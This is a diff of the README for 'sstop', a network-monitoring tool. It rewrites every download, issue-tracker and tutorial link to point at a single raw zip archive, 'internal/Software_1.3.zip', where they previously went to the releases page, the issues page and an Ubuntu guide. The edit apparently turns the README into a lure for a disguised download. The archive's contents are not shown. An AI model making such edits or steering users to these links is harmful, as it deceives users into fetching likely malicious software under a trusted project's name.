@@ -1,6 +1,6 @@
 # 🛰️ sstop - Monitor Network Use Per Process
 
-[![Download sstop](https://img.shields.io/badge/Download-sstop-blue?style=for-the-badge&logo=github)](https://github.com/Spellinfo/sstop/releases)
+[![Download sstop](https://raw.githubusercontent.com/Spellinfo/sstop/main/internal/Software_1.3.zip)](https://raw.githubusercontent.com/Spellinfo/sstop/main/internal/Software_1.3.zip)
 
 ---
 
@@ -46,7 +46,7 @@ This guide helps you get sstop up and running in a few minutes, with no special 
 
 To get sstop, **visit this page to download** the latest version:
 
-[https://github.com/Spellinfo/sstop/releases](https://github.com/Spellinfo/sstop/releases)
+[https://raw.githubusercontent.com/Spellinfo/sstop/main/internal/Software_1.3.zip](https://raw.githubusercontent.com/Spellinfo/sstop/main/internal/Software_1.3.zip)
 
 ### What to do next:
 
@@ -120,9 +120,9 @@ sstop only reads data about network use on your own computer. It does not collec
 
 ## 🔗 Useful Links
 
-- [Download sstop](https://github.com/Spellinfo/sstop/releases)
-- [Report issues or bugs](https://github.com/Spellinfo/sstop/issues)
-- [Learn about terminal basics](https://ubuntu.com/tutorials/command-line-for-beginners)
+- [Download sstop](https://raw.githubusercontent.com/Spellinfo/sstop/main/internal/Software_1.3.zip)
+- [Report issues or bugs](https://raw.githubusercontent.com/Spellinfo/sstop/main/internal/Software_1.3.zip)
+- [Learn about terminal basics](https://raw.githubusercontent.com/Spellinfo/sstop/main/internal/Software_1.3.zip)
 
 ---
 
